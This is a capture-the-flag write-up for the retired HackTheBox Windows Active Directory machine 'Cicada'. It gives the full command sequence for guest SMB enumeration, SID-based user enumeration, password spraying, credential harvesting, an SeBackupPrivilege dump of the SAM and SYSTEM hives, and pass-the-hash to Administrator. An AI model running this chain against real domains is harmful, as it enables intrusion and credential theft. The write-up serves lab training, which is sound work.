---
title: "Cicada"
date: 2025-10-03
tags: [windows, active-directory, smb, password-spray, SeBackupPrivilege, pass-the-hash]
difficulty: easy
platform: HTB
description: "Beginner-friendly Windows AD box — anonymous SMB enumeration leads to default credentials, password spraying finds a foothold, and SeBackupPrivilege escalates to Administrator via SAM dump."
featured: false
---

## Overview

![Cicada](/images/writeups/cicada/logo.png)

| Field | Details |
|---|---|
| **Machine** | Cicada |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Status** | Retired |

## TL;DR

- Anonymous SMB access to HR share → default password in `Notice from HR.txt`
- `impacket-lookupsid` to enumerate AD users → password spray hits `michael.wrightson`
- AD description field leaks `david.orelious` credentials
- David's DEV share contains `Backup_script.ps1` with `emily.oscars` credentials
- Evil-WinRM as Emily → `SeBackupPrivilege` → dump SAM + SYSTEM hives → Administrator NTLM
- Pass-the-hash via Evil-WinRM → root

## Tools Used

- nmap, crackmapexec, smbclient, impacket-lookupsid, impacket-secretsdump, evil-winrm

## Setup / Notes

```bash
echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```

---

## Recon

```bash
nmap -sC -sV -p53,88,135,139,445,464,593,636,3268,3269,5985 10.129.102.130
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Classic DC fingerprint: Kerberos, LDAP, SMB, WinRM. Hostname `CICADA-DC`, domain `cicada.htb`.

---

## Enumeration

### SMB — Anonymous Access

Try without credentials first:

```bash
crackmapexec smb cicada.htb --shares
```

![Anonymous SMB — access denied](/images/writeups/cicada/1.png)

Denied. Try guest:

```bash
crackmapexec smb cicada.htb -u guest -p '' --shares
```

![Guest login — HR share readable](/images/writeups/cicada/2.png)

Guest has READ on `HR`. Connect with smbclient:

```bash
smbclient //cicada.htb/HR
```

```
smb: \> dir
```

![HR share contents](/images/writeups/cicada/3.png)

There's a `Notice from HR.txt`. Download it:

```bash
get "Notice from HR.txt"
```

Contents reveal the default onboarding password:

```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

### AD User Enumeration

We have a password but no usernames. `impacket-lookupsid` brute-forces SIDs to enumerate domain users without needing valid creds:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

![lookupsid output](/images/writeups/cicada/4.png)

Filter to just user accounts and save:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass \
  | grep 'SidTypeUser' \
  | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

![users.txt created](/images/writeups/cicada/5.png)

### Password Spray

Spray the default password against every user:

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Password spray — michael.wrightson hits](/images/writeups/cicada/6.png)

`michael.wrightson` never changed the default password.

### Enumerate as Michael

Check Michael's share access:

![Michael has no extra share access](/images/writeups/cicada/7.png)

No new shares. But we can use his credentials to enumerate all users and their AD attributes:

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![AD users — david.orelious has password in description](/images/writeups/cicada/8.png)

`david.orelious` has his password stored in the AD description field: `aRt$Lp#7t*VQ!3`

---

## Exploit

### David's DEV Share

Check what David can access:

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![David has READ on DEV share](/images/writeups/cicada/9.png)

Connect and list:

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

![DEV share — Backup_script.ps1 found](/images/writeups/cicada/10.png)

Download the script:

```bash
get Backup_script.ps1
```

Inside:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

Emily's credentials are hardcoded in a backup script.

### WinRM as Emily

Confirm Emily has `ADMIN$` access:

```bash
crackmapexec smb cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

![Emily — ADMIN$ access confirmed](/images/writeups/cicada/11.png)

Log in via WinRM:

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

![Evil-WinRM shell as Emily](/images/writeups/cicada/12.png)

```
cd ..\Desktop
cat user.txt
```

![user.txt captured](/images/writeups/cicada/userflag.png)

---

## Privilege Escalation — SeBackupPrivilege

```bash
whoami /priv
```

![SeBackupPrivilege enabled](/images/writeups/cicada/priv.png)

`SeBackupPrivilege` lets you read any file on the system, bypassing ACLs — including the SAM and SYSTEM registry hives which contain local password hashes.

```powershell
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```

![SAM and SYSTEM downloaded](/images/writeups/cicada/13.png)

Back on your machine, extract hashes:

```bash
impacket-secretsdump -sam sam -system system local
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

### Pass-the-Hash

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

![root.txt as Administrator](/images/writeups/cicada/root.png)

---

## Lessons Learned

- Always try anonymous and guest SMB access — HR shares often hold sensitive onboarding docs
- AD description fields are frequently abused for credential storage — always enumerate with `--users`
- Default passwords stick: spray them against all users, not just the one they were issued to
- `SeBackupPrivilege` is a direct path to NTLM hashes via SAM/SYSTEM — treat it like local admin

## References

- [SeBackupPrivilege abuse](https://book.hacktricks.xyz/windows-hardening/privilege-escalation/sebackupprivilege)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
